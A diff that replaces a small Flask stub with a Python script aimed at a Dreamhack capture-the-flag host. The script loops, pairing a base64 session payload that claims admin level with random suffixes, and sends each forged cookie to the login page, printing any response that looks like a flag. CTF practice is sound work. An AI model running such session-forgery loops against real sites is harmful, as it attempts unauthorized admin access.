@@ -1,31 +1,24 @@
-#!/usr/bin/python3
-from flask import *
-import sqlite3
-import hashlib
-import os
-import time, random
+# standard imports
+import requests
+import os 
+import binascii
+import base64
 
-app = Flask(__name__)
-app.secret_key = os.urandom(32)
+url = "http://host1.dreamhack.games:8310/"
+session_1 = "eyJpZHgiOjEsImxldmVsIjoiYWRtaW4iLCJuYW1lIjoiQXBwbGUiLCJ1c2VyaWQiOiJBcHBsZSJ9Fxc."
 
-DATABASE = "database.db"
+for _ in range(1,1000):
+    secret_key = os.urandom(32)
+    session_2 = base64.b64encode(secret_key).decode()[0:27]
+    session_2 = session_2.replace("=","")
 
-userLevel = {
-    0: 'guest',
-    1: 'admin'
-}
-MAXRESETCOUNT = 5
 
-@app.route('/forgot_password', methods=['GET', 'POST'])
-def forgot_password():
-    if request.method == 'GET':
-        pass
-    else:
-        userid = request.form.get("userid")
-        newpassword = request.form.get("newpassword")
-        backupCode = request.form.get("backupCode", type=int)
-    print(userid)
-    print(newpassword)
-    print(backupCode)
+    new_cookie = session_1 + session_2
 
-app.run(host='0.0.0.0', port=8000)
+    print("trying secret_key {}" .format(session_2))
+
+    r = requests.get(url+"login", cookies={"session":new_cookie})
+
+    if "{" in r.text:
+
+        print(r.text)
